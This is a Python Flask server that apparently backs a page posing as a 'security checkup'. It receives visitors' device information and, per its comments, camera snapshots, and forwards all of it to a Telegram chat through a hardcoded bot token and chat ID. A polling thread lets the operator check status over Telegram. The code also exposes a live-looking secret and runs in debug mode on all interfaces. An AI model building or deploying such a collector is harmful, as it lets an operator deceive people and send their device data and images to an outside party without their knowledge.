from flask import Flask, render_template, jsonify, request
import requests
import json
import threading
import time

app = Flask(__name__)

# Replace with your Telegram bot's token and chat ID
TELEGRAM_API_TOKEN = '7613835920:AAHrUPH7VHA-NZLfFwTAgX13xU8NvQIVZ78'
CHAT_ID = '912211827'
BASE_URL = f'https://api.telegram.org/bot{TELEGRAM_API_TOKEN}'

# Send data (snapshots and device info) to Telegram
def send_to_telegram(data):
    url = f'{BASE_URL}/sendMessage'
    message = {
        'chat_id': CHAT_ID,
        'text': data
    }
    try:
        response = requests.post(url, data=message)
        if response.status_code != 200:
            print(f"Error sending message: {response.text}")
    except Exception as e:
        print(f"Error sending message: {e}")

# Handle Telegram command: /status
def handle_telegram_commands():
    last_update_id = None

    while True:
        try:
            url = f'{BASE_URL}/getUpdates?offset={last_update_id}'
            response = requests.get(url).json()

            for update in response.get('result', []):
                last_update_id = update['update_id'] + 1
                message_text = update['message'].get('text', '')
                chat_id = update['message']['chat']['id']

                # If the message is "/status", respond with server status
                if message_text == "/status":
                    send_to_telegram("Server running, waiting for data.")
        except Exception as e:
            print(f"Error checking Telegram commands: {e}")

        time.sleep(2)  # Poll every 2 seconds

# Endpoint to handle device info and snapshot data
@app.route('/device_info', methods=['POST'])
def device_info():
    data = request.get_json()

    # Send device info to Telegram
    send_to_telegram(f"Device Info: {json.dumps(data)}")
    
    return jsonify({'status': 'success'}), 200

# Main page to display the security checkup and camera
@app.route('/')
def index():
    return render_template('index.html')

if __name__ == "__main__":
    # Start Telegram command handler in a separate thread
    telegram_thread = threading.Thread(target=handle_telegram_commands)
    telegram_thread.daemon = True  # Daemonize the thread
    telegram_thread.start()
    
    # Run the Flask app on all interfaces (0.0.0.0)
    app.run(host='0.0.0.0', port=5000, debug=True)
